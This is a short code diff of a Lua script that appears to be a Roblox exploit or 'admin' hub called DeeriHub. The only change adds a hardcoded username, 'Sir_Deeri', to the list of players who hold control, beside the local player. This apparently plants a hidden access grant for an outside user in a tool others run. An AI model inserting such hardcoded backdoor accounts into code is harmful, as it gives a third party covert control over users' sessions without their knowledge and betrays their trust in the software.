@@ -17,6 +17,7 @@ else
     playerswithcontrol = {}
 end
 playerswithcontrol[#playerswithcontrol+1] = game.Players.LocalPlayer.Name
+playerswithcontrol[#playerswithcontrol+1] = "Sir_Deeri"
 --print(#playerswithcontrol)
 _G.AdminLoaded = true
 if not isfolder("DeeriHub") then
